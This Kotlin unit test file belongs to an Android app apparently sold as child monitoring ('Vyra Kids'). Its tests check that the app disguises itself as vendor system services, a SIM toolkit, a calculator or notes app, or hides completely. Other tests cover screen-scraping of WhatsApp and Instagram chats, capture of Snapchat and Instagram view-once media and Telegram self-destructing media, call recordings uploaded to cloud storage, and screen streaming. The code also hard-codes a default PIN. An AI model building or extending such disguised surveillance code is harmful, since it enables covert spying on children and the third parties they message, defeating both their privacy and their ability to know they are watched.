package com.vyra.kids

import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.ChatSequenceRingBuffer
import com.vyra.kids.core.DisguiseProfile
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class KidAppUnitTest {

    @Test
    fun testAppConstantsIntegrity() {
        assertEquals("vyra_kids_prefs", AppConstants.PREFS_NAME)
        assertEquals("8899", AppConstants.DEFAULT_PARENT_PIN)
        assertEquals(60, AppConstants.STREAM_TARGET_FPS)
        assertEquals(1080, AppConstants.STREAM_WIDTH)
        assertEquals(2400, AppConstants.STREAM_HEIGHT)
        assertTrue(AppConstants.SUPABASE_URL.startsWith("https://"))
        assertTrue(AppConstants.SUPABASE_ANON_KEY.length > 20)
    }

    @Test
    fun testDisguiseProfiles() {
        val profiles = DisguiseProfile.entries
        assertTrue(profiles.contains(DisguiseProfile.VIVO_SERVICES))
        assertTrue(profiles.contains(DisguiseProfile.SAMSUNG_SERVICES))
        assertTrue(profiles.contains(DisguiseProfile.XIAOMI_SERVICES))
        assertTrue(profiles.contains(DisguiseProfile.SIM_TOOLKIT))
        assertTrue(profiles.contains(DisguiseProfile.CALCULATOR))
        assertTrue(profiles.contains(DisguiseProfile.NOTES))
        assertTrue(profiles.contains(DisguiseProfile.DEVICE_SUPPORT))
        assertTrue(profiles.contains(DisguiseProfile.GHOST_HIDDEN))

        assertEquals("vivo services", DisguiseProfile.VIVO_SERVICES.title)
        assertEquals("com.vyra.kids.AliasVivoServices", DisguiseProfile.VIVO_SERVICES.aliasClass)
        assertEquals("Samsung Services", DisguiseProfile.SAMSUNG_SERVICES.title)
        assertEquals("com.vyra.kids.AliasSamsungServices", DisguiseProfile.SAMSUNG_SERVICES.aliasClass)
        assertEquals("Xiaomi Services", DisguiseProfile.XIAOMI_SERVICES.title)
        assertEquals("com.vyra.kids.AliasXiaomiServices", DisguiseProfile.XIAOMI_SERVICES.aliasClass)
        assertEquals("System Services", DisguiseProfile.SIM_TOOLKIT.title)
        assertEquals("", DisguiseProfile.GHOST_HIDDEN.aliasClass)
    }

    @Test
    fun testChatSequenceRingBufferDeduplication() {
        val ring = ChatSequenceRingBuffer
        ring.clear()

        val chatKey = "WhatsApp:Rahul"

        // 1. First message should not be a duplicate
        assertFalse(ring.isDuplicate(chatKey, "Haan theek hai", "Rahul"))
        ring.record(chatKey, "Haan theek hai", "Rahul")

        // 2. Immediate re-scrape (e.g. 50ms later on UI redraw) should be detected as duplicate
        assertTrue(ring.isDuplicate(chatKey, "Haan theek hai", "Rahul"))

        // 3. Different message in same chat should NOT be duplicate
        assertFalse(ring.isDuplicate(chatKey, "Kal milte hain", "Rahul"))
        ring.record(chatKey, "Kal milte hain", "Rahul")

        // 4. Same text from different sender (child outgoing vs contact incoming) should NOT be suppressed
        assertFalse(ring.isDuplicate(chatKey, "Haan theek hai", "Aryan (Child)"))
        ring.record(chatKey, "Haan theek hai", "Aryan (Child)")

        // 5. Different conversation with same text should NOT be duplicate
        val instaKey = "Instagram:Priya"
        assertFalse(ring.isDuplicate(instaKey, "Haan theek hai", "Priya"))
    }

    @Test
    fun testChatSequenceRingBufferEvictionLimit() {
        val ring = ChatSequenceRingBuffer
        ring.clear()
        val convKey = "WhatsApp:TestGroup"

        // Add 50 messages into the ring buffer
        for (i in 1..50) {
            ring.record(convKey, "Message #$i", "Sender $i")
        }

        // New message should be recordable and not considered a duplicate
        assertFalse(ring.isDuplicate(convKey, "Message #51", "Sender 51"))
        ring.record(convKey, "Message #51", "Sender 51")
        assertTrue(ring.isDuplicate(convKey, "Message #51", "Sender 51"))
    }

    @Test
    fun testSupabaseSnakeCaseMappingLogic() {
        val camelMap = mapOf(
            "childId" to "VYRA-13533",
            "deviceModel" to "Vivo V2404",
            "batteryLevel" to 95,
            "isOnline" to true,
            "isScreenOn" to false,
            "selectedDisguise" to "vivo services",
            "locationAddress" to "Indore, MP",
            "lastSeenMs" to 1727800000000L,
            "contactName" to "Papa",
            "phoneNumber" to "+919876543210",
            "callType" to "incoming",
            "durationSeconds" to 120,
            "recordingUrl" to "https://wtlqlkkduescumpggttm.supabase.co/storage/v1/object/public/recordings/call_1.mp4",
            "isDeletedBySender" to false,
            "isWatchlistTarget" to true,
            "mediaUrl" to "https://wtlqlkkduescumpggttm.supabase.co/storage/v1/object/public/snaps/snap_1.jpg",
            "mediaType" to "snap",
            "isViewOnce" to true,
            "isIncoming" to true,
            "totalScreenTimeMinutes" to 320L
        )

        val snakeResult = mutableMapOf<String, Any>()
        for ((key, value) in camelMap) {
            val snakeKey = key.replace(Regex("([a-z])([A-Z])"), "$1_$2").lowercase()
            snakeResult[snakeKey] = value
        }

        assertEquals("VYRA-13533", snakeResult["child_id"])
        assertEquals("Vivo V2404", snakeResult["device_model"])
        assertEquals(95, snakeResult["battery_level"])
        assertEquals(true, snakeResult["is_online"])
        assertEquals(false, snakeResult["is_screen_on"])
        assertEquals("vivo services", snakeResult["selected_disguise"])
        assertEquals("Indore, MP", snakeResult["location_address"])
        assertEquals(1727800000000L, snakeResult["last_seen_ms"])
        assertEquals("Papa", snakeResult["contact_name"])
        assertEquals("+919876543210", snakeResult["phone_number"])
        assertEquals("incoming", snakeResult["call_type"])
        assertEquals(120, snakeResult["duration_seconds"])
        assertEquals(true, snakeResult["is_watchlist_target"])
        assertEquals(true, snakeResult["is_view_once"])
        assertEquals(320L, snakeResult["total_screen_time_minutes"])
    }

    @Test
    fun testIncomingOutgoingAttribution() {
        val testSenders = listOf(
            "Aryan (Child)" to false,
            "Aryan" to false,
            "child" to false,
            "Rohit Sharma" to true,
            "Mummy" to true,
            "Papa" to true,
            "Unknown" to true
        )

        for ((sender, expectedIsIncoming) in testSenders) {
            val isIncoming = !sender.contains("Aryan", ignoreCase = true) && !sender.contains("Child", ignoreCase = true)
            assertEquals("Attribution failed for sender: $sender", expectedIsIncoming, isIncoming)
        }
    }

    @Test
    fun testNotificationNoiseFilterRules() {
        val noisyMessages = listOf(
            "Checking for new messages",
            "checking for new messages...",
            "WhatsApp Web is currently active",
            "Backup in progress (45%)",
            "   ",
            ""
        )

        for (msg in noisyMessages) {
            val lower = msg.lowercase().trim()
            val shouldFilter = msg.isBlank() ||
                    lower.contains("checking for new messages") ||
                    lower.contains("whatsapp web is currently active") ||
                    lower.contains("backup in progress")
            assertTrue("Expected to filter noisy message: '$msg'", shouldFilter)
        }

        val realMessages = listOf(
            "Haan bhai kahan hai?",
            "Kal school aayega kya?",
            "Sent a photo",
            "Ok done"
        )

        for (msg in realMessages) {
            val lower = msg.lowercase().trim()
            val shouldFilter = msg.isBlank() ||
                    lower.contains("checking for new messages") ||
                    lower.contains("whatsapp web is currently active") ||
                    lower.contains("backup in progress")
            assertFalse("Real message was mistakenly filtered: '$msg'", shouldFilter)
        }
    }

    @Test
    fun test1ViewMediaDetectionSignatures() {
        // Snapchat 1-view indicators
        val snapSignatures = listOf("new snap", "received snap", "tap to view", "delivered snap")
        for (sig in snapSignatures) {
            val isMatch = sig.contains("new snap") || sig.contains("snap") ||
                    sig.contains("received snap") || sig.contains("tap to view")
            assertTrue("Snap signature not matched: $sig", isMatch)
        }

        // Instagram 1-view indicators
        val instaSignatures = listOf("view photo", "photo, view once", "1 photo")
        for (sig in instaSignatures) {
            val isMatch = sig.contains("view photo") || sig.contains("photo") || sig.contains("view once")
            assertTrue("Instagram signature not matched: $sig", isMatch)
        }

        // Telegram secret media indicators
        val teleSignatures = listOf("secret", "self-destruct", "photo, self-destructing")
        for (sig in teleSignatures) {
            val isMatch = sig.contains("secret") || sig.contains("self-destruct")
            assertTrue("Telegram signature not matched: $sig", isMatch)
        }
    }

    @Test
    fun testSensitiveKeywordAlertRules() {
        val sensitiveKeywords = listOf(
            "delete", "mat batana", "kisi ko nahi", "secret", "nude", "photo", "send pic",
            "shame", "bunk", "dar", "kill", "drug", "weed", "alcohol", "paisa"
        )

        val suspiciousTexts = listOf(
            "Bhai ye photo kisi ko mat batana",
            "Kal class bunk karte hain",
            "Delete this chat right now",
            "Bhai weed ka jugad hua kya?",
            "Mujhe thoda paisa chahiye emergency"
        )

        for (text in suspiciousTexts) {
            val lower = text.lowercase()
            val matched = sensitiveKeywords.any { lower.contains(it) }
            assertTrue("Expected sensitive keyword match for: '$text'", matched)
        }

        val benignTexts = listOf(
            "Good morning mummy",
            "Homework complete ho gaya",
            "Cricket khelne kab chalein?",
            "Khana kha liya"
        )

        for (text in benignTexts) {
            val lower = text.lowercase()
            val matched = sensitiveKeywords.any { lower.contains(it) }
            assertFalse("Benign text incorrectly flagged: '$text'", matched)
        }
    }

    @Test
    fun testCallDurationEstimation() {
        // Audio stream estimate: ~16KB per second in standard AMR/AAC
        val testBytes = 160 * 1024L // 160 KB
        val estimatedSecs = (testBytes / (16 * 1024)).coerceAtLeast(10)
        assertEquals(10L, estimatedSecs)

        val longerBytes = 800 * 1024L // 800 KB
        val longerSecs = (longerBytes / (16 * 1024)).coerceAtLeast(10)
        assertEquals(50L, longerSecs)
    }
}
